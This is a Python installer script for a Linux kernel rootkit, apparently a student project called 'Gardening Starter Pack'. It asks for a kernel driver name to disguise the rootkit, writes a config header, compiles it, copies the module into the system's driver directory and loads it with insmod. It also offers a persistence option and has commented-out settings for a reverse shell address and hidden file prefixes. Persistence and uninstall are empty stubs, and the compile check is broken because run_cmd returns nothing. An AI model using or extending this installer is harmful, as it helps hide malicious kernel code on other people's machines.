#! /usr/bin/python3
# This script is used for the installation and removal of the rootkit

import os
import sys
import shlex
from shutil import move
from subprocess import STDOUT, CalledProcessError, check_output

#######
# Prompting/Printing Helpers
######

colors = {
	"RED": "\033[31m",
	"GREEN": "\033[32m",
	"YELLOW": "\033[33m",
	"BLUE": "\033[34m",
}

style = {
	"BOLD": "\033[1m",
	"RESET": "\033[0m",
}


def print_success(text):
	print(colors["GREEN"], style["BOLD"], text, style["RESET"])


def print_error(text):
	print(colors["RED"], style["BOLD"], "ERROR:", text, style["RESET"])


def print_status(text):
	print(colors["BLUE"], style["BOLD"], text, style["RESET"])


def print_question(text):
	print(colors["YELLOW"], style["BOLD"], text, style["RESET"])


def print_help():
	print("Gardening Starter Pack (Rootkit) Usage")
	print("Written by Aaron Lichtman, Arch Gupta and Brandon Weidner.")
	print("\t--install\t\tinstall the rootkit.")
	print("\t--uninstall\t\tuninstall the rootkit.")
	print("\t-h \\ --help\t\tyou seem to have figured this one out already.")


def prompt_yes_no(question):
	"""
	Prints question and waits for Y/N. Loops on invalid response.
	Returns True if Yes, False if No..
	"""
	print_question(question + " [Y / N]")
	valid_response = False
	while not valid_response:
		response = input().strip().lower()
		if response == "y":
			return True
		elif response == "n":
			return False
		else:
			print_error("Invalid response. Enter either Y or N. No other letters are valid.")


def prompt(text, default):
	"""
	Prompt with the option to leave the default.
	"""
	print_question(text + " [Default: {}]".format(default))
	response = input().strip()
	if response == "":
		return default
	else:
		return response


####
# Build Process Helpers
####

def run_cmd(command):
	"""
	Command can be either a list or a string. Exits if running command
	returns an error.
	"""
	# TODO: Pipe all output to sp.DEVNULL when done fine-tuning build script.
	if not isinstance(command, list):
		command = shlex.split(command)

	try:
		print_status("Executing: {}".format(command))
		check_output(command, stderr=STDOUT)
	except CalledProcessError as exc:
		print_error("Error running command. Exiting.")
		print(exc.output)
		sys.exit(1)


def create_config_header_file(user_defines: dict):
	"""
	Creates config.h file and populates it with user defined constants.
	:param: user_defines: dict
	"""
	contents = "#ifndef _CONFIG_H\n#define _CONFIG_H\n"
	for key, val in user_defines.items():
		contents += "#define {} {}".format(key, val)
	contents += "#endif"

	with open("config.h", "w") as f:
		f.write(contents)

####
# Persistence
####


def enable_persistence(module_name):
	print_status("Making rootkit persistent...")
	# TODO: This
	print_success("Persistence established.")
	pass


def remove_persistence(module_name):
	# TODO: This
	pass


####
# Main Setup Methods
# 	- Install
# 	- Uninstall
####

def validate_os_and_kernel():
	"""
	Checks if the rootkit is compatible with the OS and kernel.
	Exits if it's incompatible. Returns kernel version as string if
	everything is okay.
	"""
	os_info = os.uname()
	if os_info[0].lower() != "linux":
		print_error("Not on linux. Exiting.")
		sys.exit(1)

	kernel_version = os_info[2]
	valid_kernels = ["4.18.0-16-generic", "4.18.0-15-generic"]
	if kernel_version not in valid_kernels:
		print_error("Invalid kernel. Exiting.")
		sys.exit(1)

	return kernel_version


def install(kernel_version):
	print_status("Starting rootkit installation...")

	config = {}
	config["MODULE_NAME"] = "garden"
	config["DRIVER_NAME"] = prompt("Enter the name of a kernel driver to disguise your rootkit.", "garden")
	# config["HIDDEN_FILE_PREFIX"] = prompt("Enter prefix for files to hide.", "Garden")
	# config["REVERSE_SHELL_IP_ADDR"] = prompt("Enter IP address for reverse shell.")

	print_status("Creating config.h file...")
	create_config_header_file(config)
	print_success("config.h created.")

	# TODO: Compile rootkit
	print_status("Compiling rootkit...")
	if not run_cmd("make all"):
		print_error("Compiling failed.")
		sys.exit(1)
	else:
		print_success("Successful compilation.")

	# TODO: Move compiled components to the right place. Maybe drop it in "/lib/modules/{0}/garden?
	print_status("Installing rootkit...")
	module_dir = "/lib/modules/{0}/kernel/drivers/{1}".format(kernel_version, config["DRIVER_NAME"])
	if not os.path.exists(module_dir):
		os.mkdir(module_dir)

	module_dest_path = module_dir + ".ko"

	try:
		# TODO: Decide if moving the .ko file to the module_dir is necessary
		move(config["MODULE_NAME"] + ".ko", module_dest_path)
	except IOError as e:
		print_error("Unable to copy file. {}".format(e))
		sys.exit()

	# Load the kernel module
	run_cmd("depmod")
	run_cmd("insmod {}".format(module_dest_path))

	# Option to enable persistence by making the module load on boot.
	if prompt_yes_no("Enable persistence?"):
		enable_persistence(config["MODULE_NAME"])

	print_success("Successful installation.")


def uninstall():
    pass


def main():
	kernel_version = validate_os_and_kernel()

	if sys.argv[1] not in ["install", "uninstall"]:
		print_help()
	elif "install" == sys.argv[1]:
		install(kernel_version)
	elif "uninstall" == sys.argv[1]:
		uninstall()


if __name__ == "__main__":
    main()